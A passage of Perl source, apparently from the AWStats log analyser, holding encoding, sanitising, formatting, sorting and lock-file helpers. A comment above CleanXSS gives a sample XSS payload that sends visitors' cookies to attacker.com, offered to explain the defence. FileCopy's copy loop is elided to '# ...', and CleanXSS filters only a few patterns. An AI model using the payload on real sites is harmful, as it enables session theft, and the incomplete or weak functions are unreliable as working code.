	%DayPages            = %DayHits            = %DayBytes = %DayVisits = ();

	# Reset all arrays with name beginning by _
	for ( my $ix = 0 ; $ix < 6 ; $ix++ ) {
		$_from_p[$ix] = 0;
		$_from_h[$ix] = 0;
	}
	for ( my $ix = 0 ; $ix < 24 ; $ix++ ) {
		$_time_h[$ix]    = 0;
		$_time_k[$ix]    = 0;
		$_time_p[$ix]    = 0;
		$_time_nv_h[$ix] = 0;
		$_time_nv_k[$ix] = 0;
		$_time_nv_p[$ix] = 0;
	}

	# Reset all hash arrays with name beginning by _
	%_session     = %_browser_h   = %_browser_p   = ();
        %_filesize = ();
        %_requesttime = ();
	%_domener_p   = %_domener_h   = %_domener_k = %_errors_h = %_errors_k = ();
	%_filetypes_h = %_filetypes_k = %_filetypes_gz_in = %_filetypes_gz_out = ();
	%_host_p = %_host_h = %_host_k = %_host_l = %_host_s = %_host_u = ();
	%_waithost_e = %_waithost_l = %_waithost_s = %_waithost_u = ();
	%_keyphrases = %_keywords   = %_os_h = %_os_p = %_pagesrefs_p = %_pagesrefs_h =
	  %_robot_h  = %_robot_k    = %_robot_l = %_robot_r = ();
	%_worm_h = %_worm_k = %_worm_l = %_login_p = %_login_h = %_login_k =
	  %_login_l      = %_screensize_h   = ();
	%_misc_p         = %_misc_h         = %_misc_k = ();
	%_cluster_p      = %_cluster_h      = %_cluster_k = ();
	%_se_referrals_p = %_se_referrals_h = %_sider_h = %_referer_h = %_err_host_h =
	  %_url_p        = %_url_k          = %_url_e = %_url_x = ();
	%_downloads = ();
	%_unknownreferer_l = %_unknownrefererbrowser_l = ();
	%_emails_h = %_emails_k = %_emails_l = %_emailr_h = %_emailr_k =
	  %_emailr_l = ();

	for ( my $ix = 1 ; $ix < @ExtraName ; $ix++ ) {
		%{ '_section_' . $ix . '_h' }   = %{ '_section_' . $ix . '_o' } =
		  %{ '_section_' . $ix . '_k' } = %{ '_section_' . $ix . '_l' } =
		  %{ '_section_' . $ix . '_p' } = ();
	}
	foreach my $pluginname ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } )
	{

		#   		my $function="SectionInitHashArray_$pluginname()";
		#   		eval("$function");
		my $function = "SectionInitHashArray_$pluginname";
		&$function();
	}
}

#------------------------------------------------------------------------------
# Function:     Change word separators of a keyphrase string into space and
#               remove bad coded chars
# Parameters:	stringtodecode
# Input:        None
# Output:       None
# Return:		decodedstring
#------------------------------------------------------------------------------
sub ChangeWordSeparatorsIntoSpace {
	$_[0] =~ s/%0[ad]/ /ig;          # LF CR
	$_[0] =~ s/%2[02789abc]/ /ig;    # space " ' ( ) * + ,
	$_[0] =~ s/%3a/ /ig;             # :
	$_[0] =~
	  tr/\+\'\(\)\"\*,:/        /s;    # "&" and "=" must not be in this list
}

#------------------------------------------------------------------------------
# Function:		Transforms special chars by entities as needed in XML/XHTML
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub XMLEncode {
	if ( $BuildReportFormat ne 'xhtml' && $BuildReportFormat ne 'xml' ) {
		return shift;
	}
	my $string = shift;
	$string =~ s/&/&amp;/g;
	$string =~ s/</&lt;/g;
	$string =~ s/>/&gt;/g;
	$string =~ s/\"/&quot;/g;
	$string =~ s/\'/&apos;/g;
	return $string;
}

#------------------------------------------------------------------------------
# Function:		Transforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML
#				Decoding is done by XMLDecodeFromHisto.
#				AWStats data files are stored in ISO-8859-1.
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub XMLEncodeForHisto {
	my $string = shift;
	$string =~ s/\s/%20/g;
	if ( $BuildHistoryFormat ne 'xml' ) { return $string; }
	$string =~ s/=/%3d/g;
	$string =~ s/&/&amp;/g;
	$string =~ s/</&lt;/g;
	$string =~ s/>/&gt;/g;
	$string =~ s/\"/&quot;/g;
	$string =~ s/\'/&apos;/g;
	return $string;
}

#------------------------------------------------------------------------------
# Function:     Encode an ISO string to PageCode output
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub EncodeToPageCode {
	my $string = shift;
	if ( $PageCode eq 'utf-8' ) { $string = encode( "utf8", $string ); }
	return $string;
}

#------------------------------------------------------------------------------
# Function:     Encode a binary string into an ASCII string
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub EncodeString {
	my $string = shift;

	#	use bytes;
	$string =~ s/([\x2B\x80-\xFF])/sprintf ("%%%2x", ord($1))/eg;

	#	no bytes;
	$string =~ tr/ /+/s;
	return $string;
}

#------------------------------------------------------------------------------
# Function:     Decode an url encoded text string into a binary string
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:       decodedstring
#------------------------------------------------------------------------------
sub DecodeEncodedString {
	my $stringtodecode = shift;
	$stringtodecode =~ tr/\+/ /s;
	$stringtodecode =~ s/%([A-F0-9][A-F0-9])/pack("C", hex($1))/ieg;
	$stringtodecode =~ s/["']//g;

	return $stringtodecode;
}

#------------------------------------------------------------------------------
# Function:     Similar to DecodeEncodedString, but decode only
#               RFC3986 "unreserved characters"
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:       decodedstring
#------------------------------------------------------------------------------
sub DecodeRFC3986UnreservedString {
	my $stringtodecode = shift;

	$stringtodecode =~ s/%([46][1-9A-F]|[57][0-9A]|3[0-9]|2D|2E|5F|7E)/pack("C", hex($1))/ieg;

	return $stringtodecode;
}

#------------------------------------------------------------------------------
# Function:     Decode a precompiled regex value to a common regex value
# Parameters:   compiledregextodecode
# Input:        None
# Output:       None
# Return:		standardregex
#------------------------------------------------------------------------------
sub UnCompileRegex {
	shift =~ /\(\?[-^\w]*:(.*)\)/;         # Works with all perl
	# shift =~ /\(\?[-\w]*:(.*)\)/;        < perl 5.14
	return $1;
}

#------------------------------------------------------------------------------
# Function:     Clean a string of all chars that are not char or _ - \ / . \s
# Parameters:   stringtoclean, full
# Input:        None
# Output:       None
# Return:		cleanedstring
#------------------------------------------------------------------------------
sub Sanitize {
	my $stringtoclean = shift;
	my $full = shift || 0;
	if ($full) {
		$stringtoclean =~ s/[^\w\d]//g;
	}
	else {
		$stringtoclean =~ s/[^\w\d\-\\\/\.:\s]//g;
	}
	return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Clean a string of HTML tags to avoid 'Cross Site Scripting attacks'
#               and clean | char.
#				A XSS attack is providing an AWStats url with XSS code that is executed
#				when page loaded by awstats CGI is loaded from AWStats server. Such a code
#				can be<script>document.write("<img src=http://attacker.com/page.php?" + document.cookie)</script>
#				This make the browser sending a request to the attacker server that contains
#				cookie used for AWStats server sessions. Attacker can this way caught this
#				cookie and used it to go on AWStats server like original visitor. For this
#				resaon, parameter received by AWStats must be sanitized by this function
#				before being put inside a web page.
# Parameters:   stringtoclean
# Input:        None
# Output:       None
# Return:		cleanedstring
#------------------------------------------------------------------------------
sub CleanXSS {
	my $stringtoclean = shift;

	# To avoid html tags and javascript
	$stringtoclean =~ s/</&lt;/g;
	$stringtoclean =~ s/>/&gt;/g;
	$stringtoclean =~ s/|//g;

	# To avoid onload="
	$stringtoclean =~ s/onload//g;
	return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Clean tags in a string
#				AWStats data files are stored in ISO-8859-1.
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:		decodedstring
#------------------------------------------------------------------------------
sub XMLDecodeFromHisto {
	my $stringtoclean = shift;
	$stringtoclean =~ s/$regclean1/ /g;    # Replace <recnb> or </td> with space
	$stringtoclean =~ s/$regclean2//g;     # Remove others <xxx>
	$stringtoclean =~ s/%3d/=/g;
	$stringtoclean =~ s/&amp;/&/g;
	$stringtoclean =~ s/&lt;/</g;
	$stringtoclean =~ s/&gt;/>/g;
	$stringtoclean =~ s/&quot;/\"/g;
	$stringtoclean =~ s/&apos;/\'/g;
	return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Copy one file into another
# Parameters:   sourcefilename targetfilename
# Input:        None
# Output:       None
# Return:		0 if copy is ok, 1 else
#------------------------------------------------------------------------------
sub FileCopy {
	my $filesource = shift;
	my $filetarget = shift;
	if ($Debug) { debug( "FileCopy($filesource,$filetarget)", 1 ); }
	open( FILESOURCE, "$filesource" )  || return 1;
	open( FILETARGET, ">$filetarget" ) || return 1;
	binmode FILESOURCE;
	binmode FILETARGET;

	# ...
	close(FILETARGET);
	close(FILESOURCE);
	if ($Debug) { debug( " File copied", 1 ); }
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Format a QUERY_STRING
# Parameters:   query
# Input:        None
# Output:       None
# Return:		formatted query
#------------------------------------------------------------------------------
# TODO Appeller cette fonction partout ou il y a des NewLinkParams
sub CleanNewLinkParamsFrom {
	my $NewLinkParams = shift;
	while ( my $param = shift ) {
		$NewLinkParams =~ s/(^|&|&amp;)$param(=[^&]*|$)//i;
	}
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	return $NewLinkParams;
}

#------------------------------------------------------------------------------
# Function:     Show flags for other language translations
# Parameters:   Current languade id (en, fr, ...)
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub Show_Flag_Links {
	my $CurrentLang = shift;

	# Build flags link
	my $NewLinkParams = $QueryString;
	my $NewLinkTarget = '';
	if ( $ENV{'GATEWAY_INTERFACE'} ) {
		$NewLinkParams =
		  CleanNewLinkParamsFrom( $NewLinkParams,
			( 'update', 'staticlinks', 'framename', 'lang' ) );
		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)lang=[^&]*//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

		if ( $FrameName eq 'mainright' ) {
			$NewLinkTarget = " target=\"_parent\"";
		}
	}
	else {
		$NewLinkParams =
		  ( $SiteConfig ? "config=$SiteConfig&amp;" : "" )
		  . "year=$YearRequired&amp;month=$MonthRequired&amp;";
	}
	if ( $NewLinkParams !~ /output=/ ) { $NewLinkParams .= 'output=main&amp;'; }
	if ( $FrameName eq 'mainright' ) {
		$NewLinkParams .= 'framename=index&amp;';
	}

	foreach my $lng ( split( /\s+/, $ShowFlagLinks ) ) {
		$lng =
		    $LangBrowserToLangAwstats{$lng}
		  ? $LangBrowserToLangAwstats{$lng}
		  : $lng;
		if ( $lng ne $CurrentLang ) {
			my $lngtitle = _t("language_$lng") || $lng;
			my $flag = (
				  $LangAWStatsToFlagAwstats{$lng}
				? $LangAWStatsToFlagAwstats{$lng}
				: $lng
			);
			print "<a href=\""
			  . XMLEncode("$AWScript${NewLinkParams}lang=$lng")
			  . "\"$NewLinkTarget><img src=\"$DirIcons\/flags\/$flag.png\" height=\"14\" border=\"0\""
			  . AltTitle("$lngtitle")
			  . " /></a>&nbsp;\n";
		}
	}
}

#------------------------------------------------------------------------------
# Function:		Format value in bytes in a string (Bytes, Kb, Mb, Gb)
# Parameters:   bytes (integer value or "0.00")
# Input:        None
# Output:       None
# Return:       "x.yz MB" or "x.yy KB" or "x Bytes" or "0"
#------------------------------------------------------------------------------
sub Format_Bytes {
    my $bytes = shift || 0;
    my $fudge = 1;

    if ( $bytes >= ( $fudge << 40 ) ) {
        return sprintf( "%.2f", $bytes / 1099511627776 ) . " " . _t("TB");
    }
    if ( $bytes >= ( $fudge << 30 ) ) {
        return sprintf( "%.2f", $bytes / 1073741824 ) . " " . _t("GB");
    }
    if ( $bytes >= ( $fudge << 20 ) ) {
        return sprintf( "%.2f", $bytes / 1048576 ) . " " . _t("MB");
    }
    if ( $bytes >= ( $fudge << 10 ) ) {
        return sprintf( "%.2f", $bytes / 1024 ) . " " . _t("KB");
    }
    if ( $bytes < 0 ) { $bytes = "?"; }
    return int($bytes) . ( int($bytes) ? " " . _t("Bytes") : "" );
}

#------------------------------------------------------------------------------
# Function:		Format a number with thousands separator
# CL: courtesy of http://www.perlmonks.org/?node_id=2145
# Parameters:   number
# Input:        None
# Output:       None
# Return:       "999,999,999,999"
#------------------------------------------------------------------------------
sub Format_Number {
	my $number = shift || 0;
	$number =~ s/(\d)(\d\d\d)$/$1 $2/;
	$number =~ s/(\d)(\d\d\d\s\d\d\d)$/$1 $2/;
	$number =~ s/(\d)(\d\d\d\s\d\d\d\s\d\d\d)$/$1 $2/;
	
	# 从翻译映射获取千位分隔符，默认为空格
	my $separator = _t("thousands_separator");
	if ($separator eq '' || $separator eq "thousands_separator") {
		$separator = ' ';  # 默认空格
	}
	
	$number =~ s/ /$separator/g;
	return $number;
}

#------------------------------------------------------------------------------
# Function:		Return " alt=string title=string"
# Parameters:   string
# Input:        None
# Output:       None
# Return:       "alt=string title=string"
#------------------------------------------------------------------------------
sub AltTitle {
	my $string = shift || '';
	return " alt='$string' title='$string'";

	#	return " alt=\"$string\" title=\"$string\"";
	#	return ($BuildReportFormat?"":" alt=\"$string\"")." title=\"$string\"";
}

#------------------------------------------------------------------------------
# Function:		Tell if an email is a local or external email
# Parameters:   email
# Input:        $SiteDomain(exact string) $HostAliases(quoted regex string)
# Output:       None
# Return:       -1, 0 or 1
#------------------------------------------------------------------------------
sub IsLocalEMail {
	my $email = shift || 'unknown';
	if ( $email !~ /\@(.*)$/ ) { return 0; }
	my $domain = $1;
	if ( $domain =~ /^$SiteDomain$/i ) { return 1; }
	foreach (@HostAliases) {
		if ( $domain =~ /$_/ ) { return 1; }
	}
	return -1;
}

#------------------------------------------------------------------------------
# Function:		Format a date according to Message[78] (country date format)
# Parameters:   String date YYYYMMDDHHMMSS
#               Option 0=LastUpdate and LastTime date
#                      1=Arrays date except daymonthvalues
#                      2=daymonthvalues date (only year month and day)
# Input:        $Message[78]
# Output:       None
# Return:       Date with format defined by Message[78] and option
#------------------------------------------------------------------------------
sub Format_Date {
    my $date       = shift;
    my $option     = shift || 0;
    my $year       = substr( "$date", 0, 4 );
    my $month      = substr( "$date", 4, 2 );
    my $day        = substr( "$date", 6, 2 );
    my $hour       = substr( "$date", 8, 2 );
    my $min        = substr( "$date", 10, 2 );
    my $sec        = substr( "$date", 12, 2 );
    
    my $dateformat;
    if ($option == 0) {
        $dateformat = _t("dateformat_long");
    }
    else {
        $dateformat = _t("dateformat_short");
    }
    
    $dateformat =~ s/yyyy/$year/g;
    $dateformat =~ s/yy/$year/g;
    $dateformat =~ s/mmm/_t($MonthNumLib{$month})/ge;
    $dateformat =~ s/mm/$month/g;
    $dateformat =~ s/dd/$day/g;
    $dateformat =~ s/HH/$hour/g;
    $dateformat =~ s/MM/$min/g;
    $dateformat =~ s/SS/$sec/g;
    
    return "$dateformat";
}

#------------------------------------------------------------------------------
# Function:     Return 1 if string contains only ascii chars
# Parameters:   string
# Input:        None
# Output:       None
# Return:       0 or 1
#------------------------------------------------------------------------------
sub IsAscii {
	my $string = shift;
	if ($Debug) { debug( "IsAscii($string)", 5 ); }
	if ( $string =~ /^[\w\+\-\/\\\.%,;:=\"\'&?!\s]+$/ ) {
		if ($Debug) { debug( " Yes", 6 ); }
		return
		  1
		  ; # Only alphanum chars (and _) or + - / \ . % , ; : = " ' & ? space \t
	}
	if ($Debug) { debug( " No", 6 ); }
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Return the lower value between 2 but exclude value if 0
# Parameters:   Val1 and Val2
# Input:        None
# Output:       None
# Return:       min(Val1,Val2)
#------------------------------------------------------------------------------
sub MinimumButNoZero {
	my ( $val1, $val2 ) = @_;
	return ( $val1 && ( $val1 < $val2 || !$val2 ) ? $val1 : $val2 );
}

#------------------------------------------------------------------------------
# Function:     Add a val from sorting tree
# Parameters:   keytoadd keyval [firstadd]
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub AddInTree {
	my $keytoadd = shift;
	my $keyval   = shift;
	my $firstadd = shift || 0;
	if ( $firstadd == 1 ) {    # Val is the first one
		if ($Debug) { debug( "  firstadd", 4 ); }
		$val{$keyval} = $keytoadd;
		$lowerval = $keyval;
		if ($Debug) {
			debug(
				"  lowerval=$lowerval, nb elem val="
				  . ( scalar keys %val )
				  . ", nb elem egal="
				  . ( scalar keys %egal ) . ".",
				4
			);
		}
		return;
	}
	if ( exists($val{$keyval}) ) {    # Val is already in tree
		if ($Debug) { debug( "  val is already in tree", 4 ); }
		$egal{$keytoadd} = $val{$keyval};
		$val{$keyval}    = $keytoadd;
		if ($Debug) {
			debug(
				"  lowerval=$lowerval, nb elem val="
				  . ( scalar keys %val )
				  . ", nb elem egal="
				  . ( scalar keys %egal ) . ".",
				4
			);
		}
		return;
	}
	if ( $keyval <= $lowerval )
	{    # Val is a new one lower (should happens only when tree is not full)
		if ($Debug) {
			debug(
"  keytoadd val=$keyval is lower or equal to lowerval=$lowerval",
				4
			);
		}
		$val{$keyval}     = $keytoadd;
		$nextval{$keyval} = $lowerval;
		$lowerval         = $keyval;
		if ($Debug) {
			debug(
				"  lowerval=$lowerval, nb elem val="
				  . ( scalar keys %val )
				  . ", nb elem egal="
				  . ( scalar keys %egal ) . ".",
				4
			);
		}
		return;
	}

	# Val is a new one higher
	if ($Debug) {
		debug( "  keytoadd val=$keyval is higher than lowerval=$lowerval", 4 );
	}
	$val{$keyval} = $keytoadd;
	my $valcursor = $lowerval;    # valcursor is value just before keyval
	while ( $nextval{$valcursor} && ( $nextval{$valcursor} < $keyval ) ) {
		$valcursor = $nextval{$valcursor};
	}
	if ( exists($nextval{$valcursor}) )
	{    # keyval is between valcursor and nextval{valcursor}
		$nextval{$keyval} = $nextval{$valcursor};
	}
	$nextval{$valcursor} = $keyval;
	if ($Debug) {
		debug(
			"  lowerval=$lowerval, nb elem val="
			  . ( scalar keys %val )
			  . ", nb elem egal="
			  . ( scalar keys %egal ) . ".",
			4
		);
	}
}

#------------------------------------------------------------------------------
# Function:     Remove a val from sorting tree
# Parameters:   None
# Input:        $lowerval %val %egal
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub Removelowerval {
	my $keytoremove = $val{$lowerval};    # This is lower key
	if ($Debug) {
		debug( "   remove for lowerval=$lowerval: key=$keytoremove", 4 );
	}
	if ( exists($egal{$keytoremove}) ) {
		$val{$lowerval} = $egal{$keytoremove};
		delete $egal{$keytoremove};
	}
	else {
		delete $val{$lowerval};
		$lowerval = $nextval{$lowerval};    # Set new lowerval
	}
	if ($Debug) {
		debug(
			"   new lower value=$lowerval, val size="
			  . ( scalar keys %val )
			  . ", egal size="
			  . ( scalar keys %egal ),
			4
		);
	}
}

#------------------------------------------------------------------------------
# Function:     Build @keylist array
# Parameters:   Size max for @keylist array,
#               Min value in hash for select,
#               Hash used for select,
#               Hash used for order
# Input:        None
# Output:       None
# Return:       @keylist response array
#------------------------------------------------------------------------------
sub BuildKeyList {
	my $ArraySize = shift || error(
"System error. Call to BuildKeyList function with incorrect value for first param",
		"", "", 1
	);
	my $MinValue = shift || error(
"System error. Call to BuildKeyList function with incorrect value for second param",
		"", "", 1
	);
	my $hashforselect = shift;
	my $hashfororder  = shift;
	if ($Debug) {
		debug(
			"  BuildKeyList($ArraySize,$MinValue,$hashforselect with size="
			  . ( scalar keys %$hashforselect )
			  . ",$hashfororder with size="
			  . ( scalar keys %$hashfororder ) . ")",
			3
		);
	}
	delete $hashforselect->{ ''
	  }; # Those is to protect from infinite loop when hash array has an incorrect null key
	my $count = 0;
	$lowerval = 0;    # Global because used in AddInTree and Removelowerval
	%val      = ();
	%nextval  = ();
	%egal     = ();

	foreach my $key ( keys %$hashforselect ) {
		if ( $count < $ArraySize ) {
			if ( $hashforselect->{$key} >= $MinValue ) {
				$count++;
				if ($Debug) {
					debug(
						"  Add in tree entry $count : $key (value="
						  . ( $hashfororder->{$key} || 0 )
						  . ", tree not full)",
						4
					);
				}
				AddInTree( $key, $hashfororder->{$key} || 0, $count );
			}
			next;
		}
		$count++;
		if ( ( $hashfororder->{$key} || 0 ) <= $lowerval ) { next; }
		if ($Debug) {
			debug(
				"  Add in tree entry $count : $key (value="
				  . ( $hashfororder->{$key} || 0 )
				  . " > lowerval=$lowerval)",
				4
			);
		}
		AddInTree( $key, $hashfororder->{$key} || 0 );
		if ($Debug) { debug( "  Removelower in tree", 4 ); }
		Removelowerval();
	}

	# Build key list and sort it
	if ($Debug) {
		debug(
			"  Build key list and sort it. lowerval=$lowerval, nb elem val="
			  . ( scalar keys %val )
			  . ", nb elem egal="
			  . ( scalar keys %egal ) . ".",
			3
		);
	}
	my %notsortedkeylist = ();
	foreach my $key ( values %val )  { $notsortedkeylist{$key} = 1; }
	foreach my $key ( values %egal ) { $notsortedkeylist{$key} = 1; }
	@keylist = ();
	@keylist = (
		sort { ( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 ) }
		  keys %notsortedkeylist
	);
	if ($Debug) {
		debug( "  BuildKeyList End (keylist size=" . (@keylist) . ")", 3 );
	}
	return;
}

#------------------------------------------------------------------------------
# Function:     Lock or unlock update
# Parameters:   status (1 to lock, 0 to unlock)
# Input:        $DirLock (if status=0) $PROG $FileSuffix
# Output:       $DirLock (if status=1)
# Return:       None
#------------------------------------------------------------------------------
sub Lock_Update {
	my $status = shift;
	my $lock   = "$PROG$FileSuffix.lock";
	if ($status) {

		# We stop if there is at least one lock file wherever it is
		foreach my $key ( $ENV{"TEMP"}, $ENV{"TMP"}, "/tmp", "/", "." ) {
			my $newkey = $key;
			$newkey =~ s/[\\\/]$//;
			if ( -f "$newkey/$lock" ) {
				error(
					_t("An AWStats update process seems to be already running for this config file. Try later.\nIf this is not true, remove manually lock file") . " '$newkey/$lock'.",
					"", "", 1
				);
			}
		}

		# Set lock where we can
		foreach my $key ( $ENV{"TEMP"}, $ENV{"TMP"}, "/tmp", "/", "." ) {
			if ( !-d "$key" ) { next; }
			$DirLock = $key;
			$DirLock =~ s/[\\\/]$//;
			if ($Debug) { debug("Update lock file $DirLock/$lock is set"); }
			open( LOCK, ">$DirLock/$lock" )
			  || error( "Failed to create lock file $DirLock/$lock", "", "",
				1 );
			print LOCK
"AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\n";
			close(LOCK);
			last;
		}
	}
	else {

		# Remove lock
		if ($Debug) { debug("Update lock file $DirLock/$lock is removed"); }
		unlink("$DirLock/$lock");
	}
	return;
}

#------------------------------------------------------------------------------
# Function:     Signal handler to call Lock_Update to remove lock file
# Parameters:   Signal name
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub SigHandler {
	my $signame = shift;
	printf _t("%s process (ID %s) interrupted by signal %s.\n"), 
    ucfirst($PROG), $$, $signame;
	&Lock_Update(0);
	exit 1;
}

#------------------------------------------------------------------------------
# Function:     Convert an IPAddress into an integer
# Parameters:   IPAddress
# Input:        None
# Output:       None
# Return:       Int
#------------------------------------------------------------------------------
sub Convert_IP_To_Decimal {
	my ($IPAddress) = @_;
	my @ip_seg_arr = split( /\./, $IPAddress );
	my $decimal_ip_address =
	  256 * 256 * 256 * $ip_seg_arr[0] + 256 * 256 * $ip_seg_arr[1] + 256 *
	  $ip_seg_arr[2] + $ip_seg_arr[3];
	return ($decimal_ip_address);
}

#------------------------------------------------------------------------------
# Function:     Test there is at least one value in list not null
# Parameters:   List of values
# Input:        None
# Output:       None
# Return:       1 There is at least one not null value, 0 else
#------------------------------------------------------------------------------
sub AtLeastOneNotNull {
	if ($Debug) {
		debug( " Call to AtLeastOneNotNull (" . join( '-', @_ ) . ")", 3 );
	}
	foreach my $val (@_) {
		if ($val) { return 1; }
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Return the string to add in html tag to include popup javascript code
# Parameters:   tooltip number
# Input:        None
# Output:       None
# Return:       string with javascript code
#------------------------------------------------------------------------------
sub Tooltip {
	my $ttnb = shift;
	return (
		$TOOLTIPON
		? " onmouseover=\"ShowTip($ttnb);\" onmouseout=\"HideTip($ttnb);\""
		: ""
	);
}

#------------------------------------------------------------------------------
# Function:     Insert a form filter
# Parameters:   Name of filter field, default for filter field, default for exclude filter field
# Input:        $StaticLinks, $QueryString, $SiteConfig, $DirConfig
# Output:       HTML Form
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowFormFilter {
	my $fieldfiltername    = shift;
	my $fieldfilterinvalue = shift;
	my $fieldfilterexvalue = shift;
	if ( !$StaticLinks ) {
		my $NewLinkParams = ${QueryString};
		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)output(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
		print "\n<form name=\"FormFilter\" action=\""
		  . XMLEncode("$AWScript${NewLinkParams}")
		  . "\" class=\"aws_border\">\n";
		print
"<table valign=\"middle\" width=\"99%\" border=\"0\" cellspacing=\"0\" cellpadding=\"2\"><tr>\n";
		print "<td align=\"left\" width=\"50\">" . _t("Filter") . "&nbsp;:</td>\n";
		print
"<td align=\"left\" width=\"100\"><input type=\"text\" name=\"${fieldfiltername}\" value=\"$fieldfilterinvalue\" class=\"aws_formfield\" /></td>\n";
		print "<td> &nbsp; </td>";
		print "<td align=\"left\" width=\"100\">" . _t("Exclude filter") . "&nbsp;:</td>\n";
		print
"<td align=\"left\" width=\"100\"><input type=\"text\" name=\"${fieldfiltername}ex\" value=\"$fieldfilterexvalue\" class=\"aws_formfield\" /></td>\n";
		print "<td>";
		print "<input type=\"hidden\" name=\"output\" value=\""
		  . join( ',', keys %HTMLOutput )
		  . "\" />\n";

		if ($SiteConfig) {
			print
"<input type=\"hidden\" name=\"config\" value=\"$SiteConfig\" />\n";
		}
		if ($DirConfig) {
			print
"<input type=\"hidden\" name=\"configdir\" value=\"$DirConfig\" />\n";
		}
		if ( $QueryString =~ /(^|&|&amp;)year=(\d\d\d\d)/i ) {
			print "<input type=\"hidden\" name=\"year\" value=\"$2\" />\n";
		}
		if (   $QueryString =~ /(^|&|&amp;)month=(\d\d)/i
			|| $QueryString =~ /(^|&|&amp;)month=(all)/i )
		{
			print "<input type=\"hidden\" name=\"month\" value=\"$2\" />\n";
		}
		if ( $QueryString =~ /(^|&|&amp;)lang=(\w+)/i ) {
			print "<input type=\"hidden\" name=\"lang\" value=\"$2\" />\n";
		}
		if ( $QueryString =~ /(^|&|&amp;)debug=(\d+)/i ) {
			print "<input type=\"hidden\" name=\"debug\" value=\"$2\" />\n";
		}
		if ( $QueryString =~ /(^|&|&amp;)framename=(\w+)/i ) {
			print "<input type=\"hidden\" name=\"framename\" value=\"$2\" />\n";
		}
                if ( $QueryString =~ /(^|&|&amp;)databasebreak=(\w+)/i) {
                        print "<input type=\"hidden\" name=\"databasebreak\" value=\"$2\" />\n";
                }
                if ( $QueryString =~ /(^|&|&amp;)day=(\d\d)/i) {
                        print "<input type=\"hidden\" name=\"day\" value=\"$2\" />\n";
                }
                if ( $QueryString =~ /(^|&|&amp;)hour=(\d\d)/i) {
                        print "<input type=\"hidden\" name=\"hour\" value=\"$2\" />\n";
                }
		print "<input type=\"submit\" value=\" " . _t("OK") . " \" class=\"aws_button\" /></td>\n";
		print "<td> &nbsp; </td>";
		print "</tr></table>\n";
		print "</form>\n";
		print "<br />\n";
		print "\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Write other user info (with help of plugin)
# Parameters:   $user
# Input:        $SiteConfig
# Output:       URL link
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowUserInfo {
	my $user = shift;

	# Call to plugins' function ShowInfoUser
	foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoUser'} } ) {

		#		my $function="ShowInfoUser_$pluginname('$user')";
		#		eval("$function");
		my $function = "ShowInfoUser_$pluginname";
		&$function($user);
	}
}

#------------------------------------------------------------------------------
# Function:     Write other cluster info (with help of plugin)
# Parameters:   $clusternb
# Input:        $SiteConfig
# Output:       Cluster info
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowClusterInfo {
	my $cluster = shift;

	# Call to plugins' function ShowInfoCluster
	foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoCluster'} } )
	{

		#		my $function="ShowInfoCluster_$pluginname('$user')";
		#		eval("$function");
		my $function = "ShowInfoCluster_$pluginname";
		&$function($cluster);
	}
}

#------------------------------------------------------------------------------
# Function:     Write other host info (with help of plugin)
# Parameters:   $host
# Input:        $LinksToWhoIs $LinksToWhoIsIp
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowHostInfo {
	my $host = shift;

	# Call to plugins' function ShowInfoHost
	foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoHost'} } ) {

		#		my $function="ShowInfoHost_$pluginname('$host')";
		#		eval("$function");
		my $function = "ShowInfoHost_$pluginname";
		&$function($host);
	}
}

#------------------------------------------------------------------------------
# Function:     Write other url info (with help of plugin)
# Parameters:   $url
# Input:        %Aliases $MaxLengthOfShownURL $ShowLinksOnUrl $SiteDomain $UseHTTPSLinkForUrl
# Output:       URL link
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowURLInfo {
	my $url     = shift;
	my $nompage = CleanXSS($url);

	# Call to plugins' function ShowInfoURL
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowInfoURL'} } ) {

